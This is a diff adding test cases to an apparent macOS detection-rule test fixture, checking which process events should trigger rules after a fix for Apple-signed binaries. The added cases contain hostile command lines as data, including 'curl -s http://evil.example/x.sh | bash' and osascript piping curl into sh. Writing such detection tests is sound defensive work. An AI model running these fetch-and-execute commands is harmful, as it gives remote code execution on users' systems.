@@ -78,5 +78,24 @@
     "ruleId": "d1a2b3c4-2031-4000-a000-000000002031", "shouldFire": false,
     "process": { "executable": "/usr/bin/node", "commandLine": "node", "signer": "unsigned" },
     "file": { "path": "/Users/t/proj/.claude/settings.json", "action": "write",
-              "content": "{\"hooks\":{\"PreToolUse\":[{\"command\":\"echo formatting\"}]}}" } }
+              "content": "{\"hooks\":{\"PreToolUse\":[{\"command\":\"echo formatting\"}]}}" } },
+
+  { "name": "curl|bash pipeline fires (B3: was dead via not-SignerType:apple on the Apple shell)",
+    "category": "process_creation", "ruleId": "d1a2b3c4-0003-4000-a000-000000000003", "shouldFire": true,
+    "process": { "executable": "/bin/bash", "commandLine": "curl -s http://evil.example/x.sh | bash",
+                 "signer": "apple", "parentExec": "/bin/zsh" } },
+  { "name": "curl|bash launched by a system daemon does not fire (filter_system)",
+    "category": "process_creation", "ruleId": "d1a2b3c4-0003-4000-a000-000000000003", "shouldFire": false,
+    "process": { "executable": "/bin/bash", "commandLine": "curl -s http://apple.com/x | bash",
+                 "signer": "apple", "parentExec": "/usr/libexec/some_daemon" } },
+
+  { "name": "osascript do-shell-script fires (B3: was dead via not-SignerType:apple on Apple osascript)",
+    "category": "process_creation", "ruleId": "d1a2b3c4-0454-4000-b000-000000000454", "shouldFire": true,
+    "process": { "executable": "/usr/bin/osascript", "commandLine": "osascript -e 'do shell script \"curl evil|sh\"'",
+                 "signer": "apple", "parentExec": "/Applications/Sketchy.app/Contents/MacOS/Sketchy" } },
+
+  { "name": "JXA ObjC bridge download fires (B3: was dead via not-PlatformBinary on Apple osascript)",
+    "category": "process_creation", "ruleId": "d1a2b3c4-0007-4000-a000-000000000007", "shouldFire": true,
+    "process": { "executable": "/usr/bin/osascript", "commandLine": "osascript -l JavaScript -e 'ObjC.import(\"Foundation\"); $.NSURLSession; curl '",
+                 "signer": "apple", "parentExec": "/bin/zsh" } }
 ]
